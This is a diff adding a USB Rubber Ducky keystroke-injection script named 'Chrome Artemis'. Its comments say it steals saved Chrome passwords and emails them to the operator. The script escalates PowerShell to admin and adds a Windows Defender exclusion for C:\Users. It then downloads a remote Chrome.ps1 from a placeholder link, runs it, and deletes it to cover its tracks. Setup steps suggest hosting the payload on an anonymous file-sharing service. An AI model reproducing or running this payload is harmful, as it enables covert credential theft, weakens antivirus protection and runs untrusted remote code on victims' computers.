@@ -1,0 +1,61 @@
+REM Author: nejcpirecnik
+
+REM What Chrome Artemis does:
+REM 1. Makes and exception in Windows Denfender
+REM 2. Downloads the required programs
+REM 3. Saves passwords to a .txt file
+REM 4. Email the .txt file to your Gmail account
+REM 5. Deletes downloaded programs
+
+REM You can also:
+REM Modify the script so it sends the .txt to a server via FTP.
+REM Anything you really want
+
+REM Instructions:
+REM 1. Edit Chrome.ps1 and follow the comments I've added.
+REM 2. Upload the Chrome.ps1 to a file sharing service such as AnonFiles.
+REM 3. Open Script.txt
+REM 4. Replace "Chrome.ps1 DOWNLOAD LINK HERE" with your link for Chrome.ps1. Keep the "".
+REM 5. Save your .txt and encode it for Rubber Ducky.
+REM 6. Put the encoded .bin on your Ducky!
+
+REM Start of the script
+DELAY 1000
+ESCAPE
+CONTROL ESCAPE
+DELAY 400
+STRING powershell
+DELAY 400
+ENTER
+DELAY 1000
+STRING start-process PowerShell -verb runas
+ENTER
+DELAY 1000
+LEFT
+DELAY 100
+ENTER
+DELAY 1000
+STRING Set-MpPreference -ExclusionPath C:\Users
+ENTER
+DELAY 500
+STRING exit
+ENTER
+DELAY 100
+CONTROL ESCAPE
+DELAY 400
+STRING powershell
+DELAY 400
+ENTER
+DELAY 1000
+STRING (New-Object System.Net.WebClient).DownloadFile("CHROME.PS1 LINK HERE","$env:USERPROFILE\Chrome.ps1")
+ENTER
+DELAY 2000
+STRING ./Chrome.ps1
+ENTER
+DELAY 5000
+STRING del Chrome.ps1
+ENTER
+DELAY 1000
+ALT F4
+DELAY 1000
+GUI l
